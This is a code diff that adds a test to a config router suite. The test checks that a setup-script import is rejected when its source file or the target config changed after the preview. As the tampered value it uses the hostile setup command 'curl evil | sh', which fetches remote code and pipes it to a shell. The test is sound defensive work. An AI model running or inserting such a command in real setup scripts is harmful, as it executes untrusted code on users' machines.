@@ -335,6 +335,54 @@ describe("configRouter", () => {
 			expect(readFileSync(configPath, "utf-8")).toBe("{oops");
 		});
 
+		it("refuses with CONFLICT when the source or the replaced fields changed after preview", async () => {
+			const caller = createCaller(sandbox.repoPath);
+			const supersetDir = join(sandbox.repoPath, ".superset");
+			mkdirSync(supersetDir, { recursive: true });
+			writeFileSync(join(supersetDir, "config.json"), `{"setup":["npm ci"]}`);
+			const conductorPath = join(sandbox.repoPath, "conductor.json");
+			writeFileSync(conductorPath, `{"scripts":{"setup":"bun install"}}`);
+			const preview = async () =>
+				(await caller.getSetupImportCandidates({ projectId: PROJECT_ID }))
+					.candidates[0]?.fingerprint;
+
+			const reviewed = await preview();
+			writeFileSync(conductorPath, `{"scripts":{"setup":"curl evil | sh"}}`);
+			await expect(
+				caller.importSetup({
+					projectId: PROJECT_ID,
+					source: "conductor",
+					overwrite: true,
+					fingerprint: reviewed,
+				}),
+			).rejects.toMatchObject({ code: "CONFLICT" });
+
+			const reviewedAgain = await preview();
+			writeFileSync(join(supersetDir, "config.json"), `{"setup":["pnpm i"]}`);
+			await expect(
+				caller.importSetup({
+					projectId: PROJECT_ID,
+					source: "conductor",
+					overwrite: true,
+					fingerprint: reviewedAgain,
+				}),
+			).rejects.toMatchObject({ code: "CONFLICT" });
+			expect(readFileSync(join(supersetDir, "config.json"), "utf-8")).toBe(
+				`{"setup":["pnpm i"]}`,
+			);
+
+			await caller.importSetup({
+				projectId: PROJECT_ID,
+				source: "conductor",
+				overwrite: true,
+				fingerprint: await preview(),
+			});
+			expect(
+				JSON.parse(readFileSync(join(supersetDir, "config.json"), "utf-8"))
+					.setup,
+			).toEqual(["curl evil | sh"]);
+		});
+
 		it("throws NOT_FOUND when the source is gone", async () => {
 			const caller = createCaller(sandbox.repoPath);
 			await expect(
